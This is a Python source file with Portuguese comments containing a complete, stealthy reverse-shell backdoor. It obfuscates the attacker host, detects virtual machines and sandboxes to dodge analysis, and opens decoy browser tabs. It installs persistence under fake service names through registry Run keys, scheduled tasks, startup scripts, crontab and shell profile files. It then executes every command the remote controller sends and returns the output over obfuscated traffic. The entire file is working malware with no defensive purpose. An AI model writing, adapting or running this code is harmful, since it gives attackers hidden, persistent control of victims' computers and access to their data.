# reverse_shell_client.py
import socket
import subprocess
import os
import sys
import time
import platform
import getpass
import random
import string
import threading
import base64
import hashlib

# ────────────────────────────────────────────────
# CONFIGURAÇÕES OFUSCADA
# HOST e PORT ofuscados com base64 + hash simples (para evitar strings plain no binário)
def get_host():
    enc = b'U0VVX0lQX09VX0RPTUlOSU9fQVFVSQ=='  # base64 de "SEU_IP_OU_DOMINIO_AQUI"
    return base64.b64decode(enc).decode()

def get_port():
    return int(hashlib.md5(b"4444").hexdigest()[:4], 16)  # deriva de "4444" (resulta em 4444)

RECONNECT_DELAY_BASE = 5 + random.randint(0, 10)   # 5–15s aleatório
BUFFER_SIZE = 16384  # Maior para comandos pesados
DECOY_URLS = [
    "https://www.google.com/search?q=clima+hoje",
    "https://www.youtube.com/results?search_query=musica+relaxante",
    "https://www.reddit.com/hot/",
    "https://news.google.com/"
]  # Multiplas para variar

FAKE_NAMES = [
    "syshealth", "netmon", "winsec", "msupdt", "chromeext",
    "svchostnet", "dwmhelper", "ctfsvc", "windexer", "explorerupdt"
]
# ────────────────────────────────────────────────

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def stealth_open_browser():
    """Abre navegador de forma ultra-discreta + varia URL"""
    try:
        import webbrowser
        url = random.choice(DECOY_URLS)
        controller = webbrowser.get(using=None)
        controller.open(url, new=2, autoraise=False)  # new=2: nova aba/janela sem foco
    except:
        try:
            url = random.choice(DECOY_URLS)
            if platform.system() == "Windows":
                subprocess.Popen(
                    f'start /B "" "{url}"',
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                )
            else:
                subprocess.Popen(
                    ['xdg-open', url],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    preexec_fn=os.setpgrp
                )
        except:
            pass

def is_vm_or_sandbox():
    """Detecta ambientes de teste (VM, sandbox) - básico"""
    try:
        if platform.system() == "Windows":
            proc = subprocess.Popen('wmic bios get serialnumber', shell=True, stdout=subprocess.PIPE)
            output = proc.communicate()[0].decode().lower()
            if "virtual" in output or "vmware" in output or "vbox" in output:
                return True
        elif platform.system() == "Linux":
            with open('/proc/cpuinfo', 'r') as f:
                if "hypervisor" in f.read():
                    return True
        return False
    except:
        return False

def add_persistence():
    """Persistência multi-camadas + mais stealth"""
    script_path = os.path.abspath(sys.argv[0])
    system = platform.system().lower()

    try:
        if system == "windows":
            import winreg as reg

            # Camada 1: HKCU Run
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            fake_name = random.choice(FAKE_NAMES) + "_" + random_name(6)
            pythonw = os.path.join(sys.prefix, "pythonw.exe") or "pythonw.exe"
            cmd = f'"{pythonw}" "{script_path}"'
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(key, fake_name, 0, reg.REG_SZ, cmd)

            # Camada 2: Scheduled Task (mais stealth que startup folder)
            task_name = random_name(8)
            os.system(f'schtasks /create /tn "{task_name}" /tr "{cmd}" /sc onlogon /rl highest /f >nul 2>&1')

            # Camada 3: VBS fallback
            startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
            vbs_name = random_name(9) + ".vbs"
            vbs_path = os.path.join(startup, vbs_name)
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(f'CreateObject("Wscript.Shell").Run "{cmd}", 0, False')

        else:
            # Linux/macOS
            # Camada 1: crontab
            cron_line = f'@reboot sleep {random.randint(10,60)}; python3 "{script_path}" >/dev/null 2>&1 &'
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab - >/dev/null 2>&1')

            # Camada 2: .bashrc / .profile
            home = os.path.expanduser("~")
            for rc_file in [".bashrc", ".profile", ".zshrc"]:
                rc_path = os.path.join(home, rc_file)
                if os.path.exists(rc_path):
                    with open(rc_path, "a") as f:
                        f.write(f'\nnohup python3 "{script_path}" >/dev/null 2>&1 &\n')

    except:
        pass

def encrypt_data(data):
    """Criptografia simples XOR + shift (para ofuscar comunicação)"""
    key = 0xA5  # Chave arbitrária
    return bytes((b ^ key) + 1 for b in data.encode())

def decrypt_data(data):
    key = 0xA5
    return bytes((b - 1) ^ key for b in data).decode(errors="ignore")

def reverse_shell():
    if is_vm_or_sandbox():
        time.sleep(3600)  # Delay enorme se detectar VM (evita análise)
        return

    stealth_open_browser()

    time.sleep(random.uniform(2.5, 6.0))  # Delay aleatório maior

    host = get_host()
    port = get_port()

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((host, port))

            ident = f"{platform.node()}|{getpass.getuser()}|{platform.system()}"
            s.send(encrypt_data(ident))

            while True:
                try:
                    enc_data = s.recv(BUFFER_SIZE)
                    if not enc_data:
                        break
                    data = decrypt_data(enc_data).strip()

                    if data.lower() in ("exit", "quit", "q", "die", "kill"):
                        s.close()
                        sys.exit(0)

                    proc = subprocess.Popen(
                        data,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        text=True,
                        bufsize=0,
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if platform.system() == "Windows" else 0
                    )

                    try:
                        stdout, stderr = proc.communicate(timeout=30)
                        result = (stdout + stderr).rstrip() or "[empty]"
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        result = "[timeout 30s]"

                    s.send(encrypt_data(result) + b"\n")

                except:
                    break

        except:
            time.sleep(RECONNECT_DELAY_BASE + random.randint(0, 5))
            continue

if __name__ == "__main__":
    sys.excepthook = lambda *args: None

    if len(sys.argv) > 1 and sys.argv[1] in ("--install", "-i"):
        add_persistence()
        sys.exit(0)

    t = threading.Thread(target=reverse_shell, daemon=True)
    t.start()

    try:
        while True:
            time.sleep(86400 * 7)  # 1 semana - ainda mais inativo
    except:
        pass
